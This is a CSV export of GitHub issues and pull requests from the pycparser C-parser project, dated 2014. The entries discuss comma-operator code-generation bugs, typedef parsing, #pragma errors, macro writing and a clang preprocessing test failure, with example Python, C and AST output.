eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/60,47818994,MDExOlB1bGxSZXF1ZXN0MjM4OTUyOTA=,60,"modify example to use print function, rather than print statement",9568607,closed,FALSE,NA,NA,0,2014-11-05T10:07:45Z,2016-01-06T09:32:35Z,2014-11-05T13:19:26Z,CONTRIBUTOR,NA,"The explore_ast file imports print function from future.  This causes the print statement in the example to fail (it's commented by default, so not immediately obvious).  Have updated to use the print function.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/60/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/60/comments,https://api.github.com/repos/eliben/pycparser/issues/60/events,https://github.com/eliben/pycparser/pull/60,https://api.github.com/repos/eliben/pycparser/pulls/60
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/59,43311084,MDExOlB1bGxSZXF1ZXN0MjE1Mzc3MzU=,59,fix: Comma operator in Assignment,785824,closed,FALSE,NA,NA,0,2014-09-20T14:13:59Z,2014-10-05T14:06:38Z,2014-10-05T14:06:38Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com

---

If we have comma operator as the rvalue of assignment, ctoc test fails. This patch fixes problem.

Without the recursive call of compare_ast(), the assertion doesn't work.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/59/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/59/comments,https://api.github.com/repos/eliben/pycparser/issues/59/events,https://github.com/eliben/pycparser/pull/59,https://api.github.com/repos/eliben/pycparser/pulls/59
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/58,43310329,MDExOlB1bGxSZXF1ZXN0MjE1MzczOTc=,58,fix typo,785824,closed,FALSE,NA,NA,0,2014-09-20T13:32:31Z,2014-10-05T14:05:07Z,2014-10-05T14:05:06Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/58/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/58/comments,https://api.github.com/repos/eliben/pycparser/issues/58/events,https://github.com/eliben/pycparser/pull/58,https://api.github.com/repos/eliben/pycparser/pulls/58
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/57,43310195,MDExOlB1bGxSZXF1ZXN0MjE1MzczMzQ=,57,fix: comma operator in ternary operator,785824,closed,FALSE,NA,NA,0,2014-09-20T13:24:37Z,2014-09-20T13:34:36Z,2014-09-20T13:27:38Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/57/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/57/comments,https://api.github.com/repos/eliben/pycparser/issues/57/events,https://github.com/eliben/pycparser/pull/57,https://api.github.com/repos/eliben/pycparser/pulls/57
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/56,43307661,MDExOlB1bGxSZXF1ZXN0MjE1MzYyMjY=,56,Feature/comma op in ternary,785824,closed,FALSE,NA,NA,1,2014-09-20T10:52:09Z,2014-09-20T13:20:48Z,2014-09-20T13:20:48Z,CONTRIBUTOR,NA,"A comma operator in a ternary expression fails.

This patch set first adds a test fails and then fixes it.

Related Issue:
https://github.com/eliben/pycparser/issues/55
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/56/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/56/comments,https://api.github.com/repos/eliben/pycparser/issues/56/events,https://github.com/eliben/pycparser/pull/56,https://api.github.com/repos/eliben/pycparser/pulls/56
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/55,43305076,MDU6SXNzdWU0MzMwNTA3Ng==,55,[BUG] Comma operator: parenthesis discarded ,785824,closed,FALSE,NA,NA,0,2014-09-20T08:37:07Z,2014-09-20T13:34:05Z,2014-09-20T13:34:05Z,CONTRIBUTOR,NA,"Hi,

I think the direct c-to-c translation below is a bug. It discarded the parenthesis around (c=10, 0) though it's necessary to be a comma operator.

``` python
from pycparser import c_parser, c_generator

t = r""""""
int main()
{
        r = 0 ? 0 : (c = 10, 0);
}
""""""

parser = c_parser.CParser()
ast = parser.parse(t)

ast.show()
# FileAST:
#   FuncDef:
#     Decl: main, [], [], []
#       FuncDecl:
#         TypeDecl: main, []
#           IdentifierType: ['int']
#     Compound:
#       Assignment: =
#         ID: r
#         TernaryOp:
#           Constant: int, 0
#           Constant: int, 0
#           ExprList:
#             Assignment: =
#               ID: c
#               Constant: int, 10
#             Constant: int, 0

print c_generator.CGenerator().visit(ast)
# int main()
# {
#   r = 0 ? 0 : c = 10, 0;
# }
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/55/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/55/comments,https://api.github.com/repos/eliben/pycparser/issues/55/events,https://github.com/eliben/pycparser/issues/55,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/54,42294722,MDExOlB1bGxSZXF1ZXN0MjA5NDc5MjM=,54,Fix pragma error when '=' occurs.,5246357,closed,FALSE,NA,NA,2,2014-09-09T11:09:27Z,2014-09-12T12:34:57Z,2014-09-12T12:34:57Z,NONE,NA,"'=' added to pppragma_ignore.
fixes #33
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/54/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/54/comments,https://api.github.com/repos/eliben/pycparser/issues/54/events,https://github.com/eliben/pycparser/pull/54,https://api.github.com/repos/eliben/pycparser/pulls/54
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/53,42271948,MDExOlB1bGxSZXF1ZXN0MjA5MzQ0OTE=,53,Add more fake typedefs,785824,closed,FALSE,NA,NA,0,2014-09-09T05:28:28Z,2014-09-09T12:21:10Z,2014-09-09T12:21:10Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/53/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/53/comments,https://api.github.com/repos/eliben/pycparser/issues/53/events,https://github.com/eliben/pycparser/pull/53,https://api.github.com/repos/eliben/pycparser/pulls/53
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/52,42179937,MDU6SXNzdWU0MjE3OTkzNw==,52,Different ASTs from codes the same in meaning,785824,closed,FALSE,NA,NA,4,2014-09-08T09:49:49Z,2014-09-09T00:51:00Z,2014-09-08T12:32:09Z,CONTRIBUTOR,NA,"Hi,

The AST for t1 and t2 produces different ASTs which really bugs me now. My code assumes the parent of a Return node is always Compound. However, in t1, it is not.

Should we fix this? or is this your intention?

If this is your intention, I will write workaround to rewrite all if, while and for as to form link in t2. Please tell me if caring only these three is not sufficient.

``` python
rom pycparser import c_parser

t1 = r""""""
int f()
{
        if (0)
                return 0;

        while (0)
                return 0;

        for (;;)
                return 0;
}
""""""

t2 = r""""""
int f()
{
        if (0) {
                return 0;
        }

        while (0) {
                return 0;
        }

        for (;;) {
                return 0;
        }
}
""""""

def parse(t):
        parser = c_parser.CParser()
        parser.parse(t).show()

parse(t1)
parse(t2)
```

OUTPUT:

```
FileAST:
  FuncDef:
    Decl: f, [], [], []
      FuncDecl:
        TypeDecl: f, []
          IdentifierType: ['int']
    Compound:
      If:
        Constant: int, 0
        Return:
          Constant: int, 0
      While:
        Constant: int, 0
        Return:
          Constant: int, 0
      For:
        Return:
          Constant: int, 0
FileAST:
  FuncDef:
    Decl: f, [], [], []
      FuncDecl:
        TypeDecl: f, []
          IdentifierType: ['int']
    Compound:
      If:
        Constant: int, 0
        Compound:
          Return:
            Constant: int, 0
      While:
        Constant: int, 0
        Compound:
          Return:
            Constant: int, 0
      For:
        Compound:
          Return:
            Constant: int, 0
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/52/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/52/comments,https://api.github.com/repos/eliben/pycparser/issues/52/events,https://github.com/eliben/pycparser/issues/52,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/51,41769208,MDExOlB1bGxSZXF1ZXN0MjA2NDg1NTE=,51,Feature/add typedefs,785824,closed,FALSE,NA,NA,1,2014-09-02T23:58:38Z,2014-09-20T12:21:57Z,2014-09-20T12:21:57Z,CONTRIBUTOR,NA,"To parse ucontext.h, these typedefs are required.

---

Sorry, I made a mistake in git operation: these two patches are totally irrelevant so to be in different PR. If you don't like to merge both please tell me and I will fix the PR. But I think that won't be the case.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/51/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/51/comments,https://api.github.com/repos/eliben/pycparser/issues/51/events,https://github.com/eliben/pycparser/pull/51,https://api.github.com/repos/eliben/pycparser/pulls/51
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/50,41697528,MDU6SXNzdWU0MTY5NzUyOA==,50,Why do we need _fake_defines.h?,785824,closed,FALSE,NA,NA,1,2014-09-02T11:01:57Z,2014-09-07T01:38:14Z,2014-09-07T01:38:14Z,CONTRIBUTOR,NA,"pycparser needs the input file preprocessed. We may use fake include to parse codes for arbitrary compiler. This is what you describe in https://github.com/eliben/pycparser#what-about-the-standard-c-library-headers

However, one question arises: _fake_typedefs.h is truly needed because without this parsing often fail but what about _fake_defines.h? I don't think we need this. Because, pycparser can't be parse only if definition like typedef or struct is not found, which is listed in _fake_typedef.h.

Actually, the code below doesn't fail although N is not found. Furthermore, the syntactically incorrect recursive call `f(1)` is parsed.

``` python
def p(t):
        parser = c_parser.CParser()
        parser.parse(t).show()

t1 = r""""""
void f()
{
  int x = N;
  int x = true;
  f(1);
}
""""""
p(t1)
```

_fake_defines.h is not only unnecessary but has downside: As a result of preprocessing (or text replacing) with that fake defines, the preprocess-ed file loses all information of the past (or before preprocessing). This means, AST transformation or even analysis on the code differs from what is expected on the past code. In other word, a file and the preprocessed are completely irrelevant.

As a conclusion, I propose deleting _fake_defines.h.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/50/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/50/comments,https://api.github.com/repos/eliben/pycparser/issues/50/events,https://github.com/eliben/pycparser/issues/50,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/49,41603336,MDExOlB1bGxSZXF1ZXN0MjA1NTI5MjA=,49,fix: compare_asts(),785824,closed,FALSE,NA,NA,1,2014-09-01T02:46:39Z,2014-09-20T10:15:41Z,2014-09-20T10:15:41Z,CONTRIBUTOR,NA,"Add recursive call in case the asts are both tuple.

Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/49/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/49/comments,https://api.github.com/repos/eliben/pycparser/issues/49/events,https://github.com/eliben/pycparser/pull/49,https://api.github.com/repos/eliben/pycparser/pulls/49
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/48,41340231,MDExOlB1bGxSZXF1ZXN0MjA0MDgzNTA=,48,Add a ctoc test (#47),785824,closed,FALSE,NA,NA,0,2014-08-27T23:04:55Z,2014-08-31T12:42:23Z,2014-08-31T12:42:23Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/48/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/48/comments,https://api.github.com/repos/eliben/pycparser/issues/48/events,https://github.com/eliben/pycparser/pull/48,https://api.github.com/repos/eliben/pycparser/pulls/48
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/47,41250836,MDU6SXNzdWU0MTI1MDgzNg==,47,bug: interpret comma operator incorrectly,785824,closed,FALSE,NA,NA,3,2014-08-27T05:50:58Z,2014-08-27T22:22:48Z,2014-08-27T20:53:24Z,CONTRIBUTOR,NA,"Hi,

Though we expect the input code is regenerated in the same way but it isn't actually. And worse, output code can't be compiled. What is the main cause and how can we fix this?

Comma operator is out of support of pycparser?

``` python
from pycparser import c_parser, c_generator

import os

t1 = r""""""
int f(int x) { return x; }
int main()
{
  int x = f((1,2));
  return 0;
}
""""""

parser = c_parser.CParser()
ast = parser.parse(t1)

# FileAST:
#   FuncDef:
#     Decl: f, [], [], []
#       FuncDecl:
#         ParamList:
#           Decl: x, [], [], []
#             TypeDecl: x, []
#               IdentifierType: ['int']
#         TypeDecl: f, []
#           IdentifierType: ['int']
#     Compound:
#       Return:
#         ID: x
#   FuncDef:
#     Decl: main, [], [], []
#       FuncDecl:
#         TypeDecl: main, []
#           IdentifierType: ['int']
#     Compound:
#       Decl: x, [], [], []
#         TypeDecl: x, []
#           IdentifierType: ['int']
#         FuncCall:
#           ID: f
#           ExprList:
#             ExprList:
#               Constant: int, 1
#               Constant: int, 2
#       Return:
#         Constant: int, 0
ast.show()

generator = c_generator.CGenerator()

# int f(int x)
# {
#   return x;
# }
#
# int main()
# {
#   int x = f({1, 2});
#   return 0;
# }
output = generator.visit(ast)
print(output)

# <stdin>: In function 'main':
# <stdin>:8:13: error: expected expression before '{' token
os.system(""echo \""%s\"" | gcc -xc -"" % output)
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/47/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/47/comments,https://api.github.com/repos/eliben/pycparser/issues/47/events,https://github.com/eliben/pycparser/issues/47,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/46,41013005,MDU6SXNzdWU0MTAxMzAwNQ==,46,Repeated Struct typedef generates an error,8516797,closed,FALSE,NA,NA,6,2014-08-24T16:23:39Z,2016-08-09T08:42:53Z,2015-04-20T23:20:10Z,NONE,NA,"This generates an error:

typedef const struct Ntf_FBlock_L_Type
{
    int FBlockIndex;
    int NumDev;
    int PtrPropTab;
} TNtfFBlockL, *pTNtfFBlockL;

typedef const struct Ntf_FBlock_L_Type
{
    int FBlockIndex;
    int NumDev;
    int PtrPropTab;
} TNtfFBlockL, *pTNtfFBlockL;

(it is repeated on purpose) However a repeated typedef like this:

typedef int INTEGER;
typedef int INTEGER;

does not generate any error nor this:

typedef const struct Ntf_FBlock_L_Type
{
    int FBlockIndex;
    int NumDev;
    int PtrPropTab;
} TNtfFBlockL;;

typedef const struct Ntf_FBlock_L_Type
{
    int FBlockIndex;
    int NumDev;
    int PtrPropTab;
} TNtfFBlockL;

So it just generates an error in the first case, it just throws a ""ParserError before: ,""

What can I do to avoid this situation?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/46/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/46/comments,https://api.github.com/repos/eliben/pycparser/issues/46/events,https://github.com/eliben/pycparser/issues/46,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/45,41010040,MDU6SXNzdWU0MTAxMDA0MA==,45,question: What is the best way to rewrite all return node to goto node?,785824,closed,FALSE,NA,NA,2,2014-08-24T14:11:37Z,2014-08-24T21:38:01Z,2014-08-24T21:38:01Z,CONTRIBUTOR,NA,"Regarding to my macro-of-inline project, I am trying to rewrite all `return` to `goto label`. For example,

``` c
void f()
{
  if (1) { return; }
label:
  ;
}
```

will be

``` c
void f()
{
  if (1) { goto label; }
label:
  ;
}
```

I think this is impossible with NodeVisitor with visit_Return because what is passed when it visits Return node is a reference to the Return node so we can't change it to Goto node but only can change the value of the Return node.

In pycparser, what is the best way to do this? In python, is it possible to overwrite class of a object?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/45/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/45/comments,https://api.github.com/repos/eliben/pycparser/issues/45/events,https://github.com/eliben/pycparser/issues/45,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/44,40994000,MDU6SXNzdWU0MDk5NDAwMA==,44,Introduce macro-of-inline as an application of pycparser library,785824,closed,FALSE,NA,NA,1,2014-08-24T03:17:49Z,2014-08-24T21:35:50Z,2014-08-24T21:35:50Z,CONTRIBUTOR,NA,"Do you want an application of pycparser library more than tiny examples? Here it is. Let's me introduce my new application ""macro-of-inline"".

https://github.com/akiradeveloper/macro-of-inline

macro-of-inilne is a kind of preprocessor that translates inline functions to equivalent macros. Some bad compilers doesn't support function inlining and that's where my application does great.

Thanks to pycparser, macro-of-inline is only a few hundreds of LOC and thus easy to understand. If you have some interests on my project feel free to contact me. Also, fixing and refactoring are all welcome.

Cheers,

Akira
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/44/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/44/comments,https://api.github.com/repos/eliben/pycparser/issues/44/events,https://github.com/eliben/pycparser/issues/44,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/43,40963452,MDExOlB1bGxSZXF1ZXN0MjAyMDQ3MTM=,43,Add Any node,785824,closed,FALSE,NA,NA,2,2014-08-23T01:03:34Z,2014-08-23T23:56:13Z,2014-08-23T23:56:13Z,CONTRIBUTOR,NA,"To write out any text representation under FileAST node is required
by such program that tries to convert inline function to equivalent macro.

This patch adds Any node which is not relevant to parsing but only to
writing out (via generator).

Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com

---

This patch is related to #42 

I hope you like this patch.

The AST-rewrite example is rewritten. The code after the rewrite is now:

``` c
#define f(a) ((a) * 2)
/* rewrited function */
void func(void)
{
  y = 2;
}
```
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/43/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/43/comments,https://api.github.com/repos/eliben/pycparser/issues/43/events,https://github.com/eliben/pycparser/pull/43,https://api.github.com/repos/eliben/pycparser/pulls/43
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/42,40960453,MDU6SXNzdWU0MDk2MDQ1Mw==,42,Node to writing out macro,785824,closed,FALSE,NA,NA,0,2014-08-22T23:42:40Z,2014-08-23T23:56:33Z,2014-08-23T23:56:33Z,CONTRIBUTOR,NA,"Hi,

I am writing a program with this library that converts inline function within a file to an equivalent macro. For example,

```
inline void fun(int y)
{
  x = y;
}
```

to

```
#define fun(y) ¥
do { ¥
  x = y;
} while (0)
```

I have done most of the works including macro hygiene (renames identifiers so they don't conflict). But confronts a problem in writing out the generated macro that is represented as simple string.

My idea is to first search for all the inline functions within the preprocessed file and rewrite them to the macros in AST-level which means popping out the old AST node that represents the function and inserting a node that will write out the macro into the location.

I know parsing a macro is really difficult and that's the reason you don't support it but what about writing out? I think a AST node that includes a string and simply writes it out when visited by generator will suffice.

I am searching for such node class but I couldn't find it yet. Do you have it? and If not, may I implement it? You don't like this idea? The node will only be located just under FileAST so it won't confuse the syntax.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/42/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/42/comments,https://api.github.com/repos/eliben/pycparser/issues/42/events,https://github.com/eliben/pycparser/issues/42,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/41,40933401,MDExOlB1bGxSZXF1ZXN0MjAxODY3ODk=,41,"moving utils inside pycparser, adding fake_stdlib argument to preprocess...",114267,closed,FALSE,NA,NA,3,2014-08-22T17:56:40Z,2015-04-18T13:10:56Z,2015-04-18T13:10:56Z,NONE,NA,"..._file and parse_file

I noticed that ""utils"" was being installed into site-packages (not inside pycparser). I moved utils, modified the manifest and setup.py to reflect the move. I think this is a safer location to install the utils as it avoids conflicts with other packages that might try to install their own utils directory.

Also, I added an optional keyword argument shortcut to preprocess_file and parse_file to use the faked stdlib (fake_stdlib).
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/41/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/41/comments,https://api.github.com/repos/eliben/pycparser/issues/41/events,https://github.com/eliben/pycparser/pull/41,https://api.github.com/repos/eliben/pycparser/pulls/41
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/40,40877315,MDExOlB1bGxSZXF1ZXN0MjAxNTI0OTA=,40,examples: add example of rewriting AST node,785824,closed,FALSE,NA,NA,1,2014-08-22T04:33:08Z,2014-08-22T12:32:56Z,2014-08-22T12:32:50Z,CONTRIBUTOR,NA,"Signed-off-by: Akira Hayakawa ruby.wktk@gmail.com
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/40/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/40/comments,https://api.github.com/repos/eliben/pycparser/issues/40/events,https://github.com/eliben/pycparser/pull/40,https://api.github.com/repos/eliben/pycparser/pulls/40
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/39,40790083,MDU6SXNzdWU0MDc5MDA4Mw==,39,question: macro supported?,785824,closed,FALSE,NA,NA,2,2014-08-21T10:10:00Z,2014-08-21T13:11:58Z,2014-08-21T13:11:58Z,CONTRIBUTOR,NA,"Hi, I looked through examples and tests but I could't find parsing and generating C macros.

Is it possible to read/write macros with this program?

An example of macro

```
#define f(x) do {} while (0)
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/39/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/39/comments,https://api.github.com/repos/eliben/pycparser/issues/39/events,https://github.com/eliben/pycparser/issues/39,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/38,40432681,MDU6SXNzdWU0MDQzMjY4MQ==,38,Feature: built-in ply based preprocessor?,166642,closed,FALSE,NA,NA,8,2014-08-17T12:05:50Z,2014-08-21T12:35:35Z,2014-08-19T16:22:03Z,NONE,NA,"A friend happened to come upon [this code](https://code.google.com/p/ply/source/browse/trunk/ply/cpp.py) in the ply distribution which implements an ANSI-C compatible preprocessor.

Would that be a suitable replacement for using cpp.exe? Pycparser could support it transparently.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/38/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/38/comments,https://api.github.com/repos/eliben/pycparser/issues/38/events,https://github.com/eliben/pycparser/issues/38,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/37,39717159,MDU6SXNzdWUzOTcxNzE1OQ==,37,Windows: utils/* not being installed?,166642,closed,FALSE,NA,NA,6,2014-08-07T11:43:28Z,2020-03-03T14:42:58Z,2020-03-03T14:42:58Z,NONE,NA,"I noticed that cpp.exe is not installed with pycparser. Is that a bug or a deliberate choice? It would be enormously helpful to be able to depend on cpp.exe when pycparser is installed as in e.g. 

`CPPPATH = os.path.join(os.path.abspath(os.path.dirname(pycparser.__file__)),'utils', 'cpp.exe')`
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/37/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/37/comments,https://api.github.com/repos/eliben/pycparser/issues/37/events,https://github.com/eliben/pycparser/issues/37,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/36,37035538,MDU6SXNzdWUzNzAzNTUzOA==,36,Type modifier chains: better support in generator?,166642,closed,FALSE,NA,NA,2,2014-07-02T23:51:08Z,2014-07-15T05:17:54Z,2014-07-15T05:17:54Z,NONE,NA,"I looked at how pycparserext patches the parser to support new type attributes and ended up rolling my own variant that just used a new AttributeDecl as a type modifier.

On the parser side it seems adding new modifiers is pretty straight forward (just support 'type' attribute for chaining), but on the generator side, things get a bit more ugly. I have to override _generate_type completely to add my new modifier; it requires adding a new recursive call that recursively appends a node to the modifiers, and a new entry to the string generator if-blocks that does something to nstr depending on my new modifier.

I would rather use the _generate_type that's there, and instead expand the class with new functions that don't overwrite old functionality, but that requires a few modifications.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/36/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/36/comments,https://api.github.com/repos/eliben/pycparser/issues/36/events,https://github.com/eliben/pycparser/issues/36,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/35,35195711,MDExOlB1bGxSZXF1ZXN0MTY4NDk5MTE=,35,Fixes Github TOC navigation,3574444,closed,FALSE,NA,NA,3,2014-06-07T01:30:02Z,2015-04-18T13:10:13Z,2015-04-18T13:10:13Z,NONE,NA,"With sectnum we can't navigate through the TOC on github. Would this affect pypi?
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/35/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/35/comments,https://api.github.com/repos/eliben/pycparser/issues/35/events,https://github.com/eliben/pycparser/pull/35,https://api.github.com/repos/eliben/pycparser/pulls/35
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/34,34196576,MDExOlB1bGxSZXF1ZXN0MTYyODU5NzU=,34,Bug in c_generator: children now returns a list of 2-tuples,4551516,closed,FALSE,NA,NA,0,2014-05-23T17:46:55Z,2014-06-19T20:26:50Z,2014-05-23T23:54:29Z,CONTRIBUTOR,NA,"A minor bug, as generic_visit isn't generally called since most node types have a specific visitor, but could occur if someone tries to generate starting at a PtrDecl, for example.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/34/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/34/comments,https://api.github.com/repos/eliben/pycparser/issues/34/events,https://github.com/eliben/pycparser/pull/34,https://api.github.com/repos/eliben/pycparser/pulls/34
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/33,32135119,MDU6SXNzdWUzMjEzNTExOQ==,33,why this  #pragma generates error?,7393680,closed,FALSE,NA,NA,2,2014-04-24T09:58:32Z,2014-09-12T12:46:28Z,2014-09-12T12:34:57Z,NONE,NA,"Why the following #pragma:

```
#pragma ghs section somestring=""some_other_string""
```

generates error:

```
 AssertionError: invalid #pragma directive
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/33/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/33/comments,https://api.github.com/repos/eliben/pycparser/issues/33/events,https://github.com/eliben/pycparser/issues/33,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/32,31809157,MDU6SXNzdWUzMTgwOTE1Nw==,32,Test failure with clang 5.1 on OS X 10.9,404650,closed,FALSE,NA,NA,2,2014-04-18T16:36:32Z,2014-04-23T23:59:33Z,2014-04-23T23:59:33Z,NONE,NA,"I encountered a very strange error when running the test suite on OS X with clang.

```
Generating LALR tables
WARNING: 1 shift/reduce conflict
........................In file included from tests/c_files/memmgr.c:8:
tests/c_files/memmgr.h:37:7: warning: missing terminating ' character
      [-Winvalid-pp-token]
// you'll probably want to keep those undefined, because
      ^
tests/c_files/memmgr.h:96:8: warning: extra tokens at end of #endif directive
      [-Wextra-tokens]
#endif // MEMMGR_H
       ^
       //
tests/c_files/memmgr.c:97:56: warning: missing terminating ' character
      [-Winvalid-pp-token]
    // that if nbytes is a multiple of nquantas, we don't allocate too much
                                                       ^
tests/c_files/memmgr.c:119:28: warning: missing terminating ' character
      [-Winvalid-pp-token]
                // its prev's next to its next
                           ^
4 warnings generated.
E.....................................................
======================================================================
ERROR: test_with_cpp (test_general.TestParsing)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/Users/daniel/Downloads/pycparser-release_v2.10/tests/test_general.py"", line 34, in test_with_cpp
    cpp_args='-I%s' % c_files_path)
  File ""./pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""./pycparser/c_parser.py"", line 138, in parse
    debug=debuglevel)
  File ""./pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""./pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""./pycparser/c_parser.py"", line 1613, in p_error
    column=self.clex.find_tok_column(p)))
  File ""./pycparser/plyparser.py"", line 54, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
ParseError: tests/c_files/memmgr.c:1:1: before: /

----------------------------------------------------------------------
Ran 78 tests in 5.642s

FAILED (errors=1)
```

It took a while to figure out, but the problem seems to be that `cpp`, which calls `clang`, leaves all `//` comments in the output, though it does remove `/* */` comments. Even weirder, calling `clang -E` directly does the expected thing and removes all comments! I'd say this is a bug in clang, but in any case pycparser malfunctions with clang. If I change `preprocess_file()` to always call `clang -E` instead of `cpp` the tests all pass. It also works with `cc -E` and `gcc -E`, which are symlinks to `clang`.

I'm not sure what the best solution is but thought you should be aware of it.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/32/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/32/comments,https://api.github.com/repos/eliben/pycparser/issues/32/events,https://github.com/eliben/pycparser/issues/32,NA
